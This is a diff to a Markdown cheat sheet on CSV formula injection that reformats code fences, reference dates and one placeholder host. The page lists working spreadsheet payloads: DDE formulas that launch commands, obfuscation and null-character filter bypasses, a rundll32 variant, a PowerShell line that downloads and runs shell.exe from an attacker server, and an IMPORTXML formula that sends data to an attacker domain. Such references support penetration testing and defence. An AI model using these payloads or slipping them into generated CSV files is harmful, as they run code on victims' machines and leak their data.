@@ -12,7 +12,7 @@
 
 CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted input is included in a CSV file. Any formula can be started with:
 
-```powershell
+```text
 =
 +
 –
@@ -23,7 +23,7 @@ Basic exploits with **Dynamic Data Exchange**.
 
 * Spawn a calc
 
-    ```powershell
+    ```text
     DDE ("cmd";"/C calc";"!A0")A0
     @SUM(1+1)*cmd|' /C calc'!A0
     =2+5+cmd|' /C calc'!A0
@@ -32,13 +32,13 @@ Basic exploits with **Dynamic Data Exchange**.
 
 * PowerShell download and execute
 
-    ```powershell
+    ```text
     =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
     ```
 
 * Prefix obfuscation and command chaining
 
-    ```powershell
+    ```text
     =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
     =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
     =         cmd|'/c calc.exe'!A
@@ -46,14 +46,14 @@ Basic exploits with **Dynamic Data Exchange**.
 
 * Using rundll32 instead of cmd
 
-    ```powershell
+    ```text
     =rundll32|'URL.dll,OpenURL calc.exe'!A
     =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
     ```
 
 * Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
 
-    ```powershell
+    ```text
     =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
     ```
 
@@ -75,18 +75,18 @@ Google Sheets allows some additional formulas that are able to fetch remote URLs
 
 So one can test blind formula injection or a potential for data exfiltration with:
 
-```c
-=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
+```text
+=IMPORTXML("http://[ATTACKER.DOMAIN.TLD]/csv", "//a/@href")
 ```
 
 Note: an alert will warn the user a formula is trying to contact an external resource and ask for authorization.
 
 ## References
 
-* [CSV Excel Macro Injection - Timo Goosen, Albinowax - Jun 21, 2022](https://web.archive.org/web/20260211194330/https://owasp.org/www-community/attacks/CSV_Injection)
+* [CSV Excel Macro Injection - Timo Goosen, Albinowax - June 21, 2022](https://web.archive.org/web/20260211194330/https://owasp.org/www-community/attacks/CSV_Injection)
 * [CSV Excel formula injection - Google Bug Hunter University - May 22, 2022](https://web.archive.org/web/20251126193606/https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)
-* [CSV Injection – A Guide To Protecting CSV Files - Akansha Kesharwani - 30/11/2017](https://web.archive.org/web/20221205154959/https://payatu.com/csv-injection-basic-to-exploit/)
-* [From CSV to Meterpreter - Adam Chester - November 05, 2015](https://web.archive.org/web/20251020005639/https://blog.xpnsec.com/from-csv-to-meterpreter/)
-* [The Absurdly Underestimated Dangers of CSV Injection - George Mauer - 7 October, 2017](https://web.archive.org/web/20260216175809/https://georgemauer.net/2017/10/07/csv-injection.html)
+* [CSV Injection – A Guide To Protecting CSV Files - Akansha Kesharwani - November 30, 2017](https://web.archive.org/web/20221205154959/https://payatu.com/csv-injection-basic-to-exploit/)
+* [From CSV to Meterpreter - Adam Chester - November 5, 2015](https://web.archive.org/web/20251020005639/https://blog.xpnsec.com/from-csv-to-meterpreter/)
+* [The Absurdly Underestimated Dangers of CSV Injection - George Mauer - October 7, 2017](https://web.archive.org/web/20260216175809/https://georgemauer.net/2017/10/07/csv-injection.html)
 * [Three New DDE Obfuscation Methods - ReversingLabs - September 24, 2018](https://web.archive.org/web/20220928031043/https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
 * [Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection - we45 - October 5, 2020](https://web.archive.org/web/20260115180627/https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)
